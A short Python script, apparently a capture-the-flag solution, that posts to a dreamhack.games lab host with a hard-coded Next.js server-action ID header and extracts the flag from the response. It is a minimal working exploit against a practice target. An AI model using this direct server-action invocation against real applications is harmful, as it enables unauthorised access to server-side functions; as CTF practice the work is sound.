import requests
import re

BASE_URL = "http://host8.dreamhack.games:11542/"
HEADER = {
    "Content-Type": "application/json",
    "Next-Action": "7be4073b46655ad71ea7fbfe6cd2e95ab20fd3f0"
}
response = requests.post(BASE_URL, headers=HEADER, data="{}")
print(response.text)
flag_here = re.search(r'(flag\{.*?\})', response.text)
if flag_here:
    print(f"[+] Done Flag Here: \n", flag_here.group(1))
else:
    print(f"[-] Failed Try Again!")